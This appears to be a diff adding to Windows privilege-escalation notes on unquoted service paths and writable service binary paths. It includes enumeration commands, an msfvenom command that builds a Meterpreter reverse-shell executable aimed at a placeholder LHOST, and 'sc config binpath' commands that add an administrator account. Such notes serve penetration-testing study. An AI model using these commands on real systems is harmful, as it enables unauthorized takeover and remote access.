@@ -45,14 +45,54 @@ To successfully exploit this vulnerability, we need three things:
 • Write permissions for any of the folders containing spaces.
 • A way to reboot the service or system in order to execute a payload.
 
+By way of example: C:\Program Files\Program\Some.exe , C:\Program Files\Program\Some Folder\Service.exe
 
+We need write permissions in any of the following directories
+C:\
+C:\Program Files\Program\
+C:\Program Files\Program\Some Folder\
 
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+sc qc [service name]
 
+icacls "C:\Program Files\Program"
 
+msfvenom -p windows/meterpreter/reverse_tcp -e LHOST=[LHOST IP] LPORT=443 -f exe -o Some.exe
+sc stop [service name]
+sc start [service name]
+
+exploit/windows/local/trusted_service_path
+
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 
 
 -- Modifying the binary service path --
 
+We can also attempt to modify the binary service path of a service and point it to a malicious executable placed in a writable directory. 
+To do this we need permissions to modify the service path for a given service. 
+A popular tool to check for service permissions on Windows is a tool named accesschk.exe.
+
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+RW [service name] SERVICE_ALL_ACCESS
+sc qc [service name]
+
+In order to exploit this misconfiguration, we have to change the BINARY_PATH_NAME on the service and change it to a malicious executable which can be done using these commands
+
+sc config [service name] binpath= "malicious executable path"
+sc stop [service name]
+sc start [service name]
+
+We can also use the binary path to add a new user and grant administrator rights:
+
+sc config [service name] binpath= "net user admin password /add"
+sc stop [service name]
+sc start [service name]
+
+sc config [service name] binpath= "net localgroup Administrators admin /add"
+sc stop [service name]
+sc start [service name]
+
+exploit/windows/local/service_permissions
 
 
 -- AlwaysInstallElevated setting --
